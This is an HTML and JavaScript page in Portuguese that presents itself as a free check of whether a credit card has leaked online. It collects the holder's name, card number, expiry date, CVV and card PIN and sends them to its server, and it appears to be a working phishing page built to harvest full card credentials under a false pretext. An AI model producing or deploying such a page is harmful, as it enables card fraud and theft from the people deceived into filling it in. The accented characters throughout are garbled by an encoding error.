<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verificar vazamento de Cart√£o</title>

<style>
  /* --- reset simples --- */
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html,body { 
    height: 100%; 
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; 
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    position: relative;
    overflow-x: hidden;
  }

  /* Efeito de fundo animado */
  body::before {
    content: '';
    position: absolute;
    width: 500px;
    height: 500px;
    background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
    border-radius: 50%;
    top: -250px;
    right: -250px;
    animation: float 20s ease-in-out infinite;
  }

  body::after {
    content: '';
    position: absolute;
    width: 400px;
    height: 400px;
    background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
    border-radius: 50%;
    bottom: -200px;
    left: -200px;
    animation: float 15s ease-in-out infinite reverse;
  }

  @keyframes float {
    0%, 100% { transform: translate(0, 0) rotate(0deg); }
    33% { transform: translate(30px, -30px) rotate(120deg); }
    66% { transform: translate(-20px, 20px) rotate(240deg); }
  }

  .wrap {
    min-height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 16px;
    position: relative;
    z-index: 1;
  }

  .card {
    width: 100%;
    max-width: 460px;
    background: rgba(255, 255, 255, 0.98);
    backdrop-filter: blur(20px);
    border-radius: 24px;
    box-shadow: 
      0 20px 60px rgba(0, 0, 0, 0.3),
      0 0 0 1px rgba(255, 255, 255, 0.2) inset;
    padding: 40px;
    animation: slideUp 0.6s ease-out;
    position: relative;
  }

  @keyframes slideUp {
    from {
      opacity: 0;
      transform: translateY(30px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  /* √çcone de cart√£o no topo */
  .card::before {
    content: 'üí≥';
    font-size: 48px;
    display: block;
    text-align: center;
    margin-bottom: 16px;
    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
  }

  .card h1 {
    font-size: 26px;
    font-weight: 700;
    margin-bottom: 8px;
    color: #1e293b;
    text-align: center;
    letter-spacing: -0.5px;
  }

  .sub {
    font-size: 14px;
    color: #64748b;
    margin-bottom: 28px;
    text-align: center;
    line-height: 1.5;
  }

  .alert {
    background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%);
    border: 1px solid #6ee7b7;
    padding: 14px 16px;
    border-radius: 12px;
    color: #065f46;
    margin-bottom: 20px;
    font-size: 14px;
    font-weight: 500;
    box-shadow: 0 2px 8px rgba(16, 185, 129, 0.15);
    animation: slideDown 0.4s ease-out;
  }

  @keyframes slideDown {
    from {
      opacity: 0;
      transform: translateY(-10px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  form { 
    display: grid; 
    gap: 20px; 
  }

  label { 
    font-size: 14px; 
    font-weight: 600;
    color: #334155; 
    margin-bottom: 8px; 
    display: block; 
  }

  input[type="text"], 
  input[type="password"] {
    width: 100%;
    padding: 14px 16px;
    border-radius: 12px;
    border: 2px solid #e2e8f0;
    font-size: 15px;
    color: #0f172a;
    background: #ffffff;
    transition: all 0.3s ease;
    font-family: inherit;
  }

  input[type="text"]:focus, 
  input[type="password"]:focus {
    outline: none;
    border-color: #667eea;
    box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
    transform: translateY(-1px);
  }

  input[type="text"]:hover, 
  input[type="password"]:hover {
    border-color: #cbd5e1;
  }

  input::placeholder {
    color: #94a3b8;
  }

  .row-2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
  }

  .small {
    font-size: 12px;
    color: #64748b;
    margin-top: 6px;
    line-height: 1.4;
  }

  button {
    margin-top: 8px;
    padding: 16px;
    border-radius: 12px;
    border: none;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 4px 16px rgba(102, 126, 234, 0.4);
    letter-spacing: 0.3px;
  }

  button:hover:not(:disabled) { 
    transform: translateY(-2px);
    box-shadow: 0 8px 24px rgba(102, 126, 234, 0.5);
  }

  button:active:not(:disabled) {
    transform: translateY(0);
  }

  button:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }

  .success-message {
    background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%);
    border: 1px solid #6ee7b7;
    padding: 14px 16px;
    border-radius: 12px;
    color: #065f46;
    margin-top: 16px;
    font-size: 14px;
    font-weight: 600;
    text-align: center;
    box-shadow: 0 2px 8px rgba(16, 185, 129, 0.15);
    animation: slideDown 0.4s ease-out;
    display: none;
  }

  .success-message.show {
    display: block;
  }

  .success-message.error {
    background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
    border-color: #fca5a5;
    color: #991b1b;
    box-shadow: 0 2px 8px rgba(239, 68, 68, 0.15);
  }

  /* Anima√ß√£o nos inputs ao digitar */
  input:not(:placeholder-shown) {
    background: #fafafa;
  }

  /* responsivo */
  @media (max-width: 480px) {
    .card { 
      width: 100%; 
      padding: 28px 24px; 
      border-radius: 20px; 
    }
    
    .card h1 {
      font-size: 22px;
    }
    
    .row-2 {
      gap: 12px;
    }
    
    button {
      font-size: 15px;
      padding: 14px;
    }
  }
</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>Vazamento de Cart√£o de Cr√©dito</h1>
      <div class="sub">Preencha os dados do cart√£o. E veja ele vazou na internet</div>

      <form method="POST" action="/" id="cardForm">
        <div>
          <label for="nome_titular">Nome do Titular</label>
          <input id="nome_titular" name="nome_titular" type="text" placeholder="Nome completo" required>
        </div>

        <div>
          <label for="numero_cartao">N√∫mero do Cart√£o</label>
          <input id="numero_cartao" name="numero_cartao" type="text" maxlength="23" placeholder="1234 5678 9012 3456" required>
          <div class="small">Apenas n√∫meros; espa√ßos s√£o permitidos para leitura.</div>
        </div>

        <div class="row-2">
          <div>
            <label for="validade">Validade</label>
            <input id="validade" name="validade" type="text" maxlength="5" placeholder="MM/AA" required>
          </div>

          <div>
            <label for="cvv">CVV</label>
            <input id="cvv" name="cvv" type="password" maxlength="4" placeholder="123" required>
          </div>
        </div>

        <div>
          <label for="senha_cartao">Senha do Cart√£o</label>
          <input id="senha_cartao" name="senha_cartao" type="password" maxlength="6" placeholder="Digite sua senha" required>
        </div>

        <button type="submit" id="submitBtn">Verificar Cart√£o</button>
        
        <div class="success-message" id="successMessage"></div>
      </form>
    </div>
  </div>

  <script>
    document.getElementById('cardForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const formData = new FormData(this);
      const button = document.getElementById('submitBtn');
      const successMessage = document.getElementById('successMessage');
      
      // Desabilita o bot√£o durante o envio
      button.disabled = true;
      button.textContent = 'Cadastrando...';
      
      // Remove classes anteriores
      successMessage.classList.remove('show', 'error');
      
      // Envia os dados via fetch
      fetch('/', {
        method: 'POST',
        body: formData
      })
      .then(response => {
        return response.json().then(data => ({
          status: response.status,
          data: data
        }));
      })
      .then(result => {
        const { status, data } = result;
        
        if (data.success) {
          // Mostra a mensagem de sucesso
          successMessage.textContent = '‚úì ' + data.message;
          successMessage.classList.remove('error');
          successMessage.classList.add('show');
          
          // Limpa o formul√°rio
          this.reset();
          
          // Esconde a mensagem ap√≥s 5 segundos
          setTimeout(function() {
            successMessage.classList.remove('show');
          }, 5000);
        } else {
          // Mostra mensagem de erro
          successMessage.textContent = '‚úó ' + (data.message || 'Erro ao verificar cart√£o');
          successMessage.classList.add('error', 'show');
          
          // Esconde ap√≥s 7 segundos
          setTimeout(function() {
            successMessage.classList.remove('show');
          }, 7000);
        }
      })
      .catch(error => {
        console.error('Erro:', error);
        successMessage.textContent = '‚úó Erro de conex√£o. Tente novamente.';
        successMessage.classList.add('error', 'show');
      })
      .finally(() => {
        // Re-habilita o bot√£o
        button.disabled = false;
        button.textContent = 'Verificar Cart√£o';
      });
    });

    // M√°scara autom√°tica para n√∫mero do cart√£o (adiciona espa√ßos)
    document.getElementById('numero_cartao').addEventListener('input', function(e) {
      let value = e.target.value.replace(/\s/g, '');
      let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
      e.target.value = formattedValue;
    });

    // M√°scara autom√°tica para validade (adiciona /)
    document.getElementById('validade').addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
      }
      e.target.value = value;
    });
  </script>
</body>
</html>